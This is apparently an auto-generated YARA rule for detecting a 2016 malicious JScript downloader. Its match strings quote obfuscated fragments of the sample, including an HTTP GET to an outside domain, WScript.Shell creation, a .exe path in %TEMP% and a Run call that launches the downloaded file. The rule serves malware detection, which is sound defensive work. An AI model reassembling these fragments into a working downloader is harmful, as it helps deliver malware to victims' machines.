rule sig_20160330_e3e6b9a9b3b1da017b8684599ad8f485 {
  meta:
    description = "datamaliciousorder - file 20160330_e3e6b9a9b3b1da017b8684599ad8f485.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "1ff798054967e23e3448c167ef61c6768b6012e9ebe07a0313326fe9887d8359"

  strings:
    $s1  = "_MT[_ZC](\"GET\", \"http://mylookalikedoll.com/n2iks\", false);" fullword ascii
    $s2  = "function _X(_L0, _G0){_CU = _CU * 1; return _L0 - _G0;};" fullword ascii
    $s3  = "var _SY = function _HT() {return WScript[_WH](\"WScript\"+\".Shell\");}(), _Z = 11;" fullword ascii
    $s4  = "if (_MT[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function _U(){return _L + \"\";};" fullword ascii
    $s6  = "function _DC() {return _SY[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"uWCgDRuCmUP0zl.ex\" + \"e\";};" fullword ascii
    $s7  = "function _N() {return ((_I == true) && (_I == _F)) ? 1 : _CU;};" fullword ascii
    $s8  = "function _UJ(_KH){_SY[\"Run\"](_KH, _CU, _CU);};" fullword ascii
    $s9  = "function _J()" fullword ascii
    $s10 = "return _X(_P0, _CD);" fullword ascii
    $s11 = " while (_OL){" fullword ascii
    $s12 = "function _KP(){return _WH;};" fullword ascii
    $s13 = "function _P(_TT) {var _G = (1, 2, 3, 4, 5, _TT); return _G;};" fullword ascii
    $s14 = "function _BB(){return 22;};" fullword ascii
    $s15 = "var _KI = new this[\"Date\"]();" fullword ascii
    $s16 = "var _I = false;" fullword ascii
    $s17 = "_F = true; " fullword ascii
    $s18 = "var _V = false;" fullword ascii
    $s19 = "_I = true; " fullword ascii
    $s20 = "} catch(_SM){};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}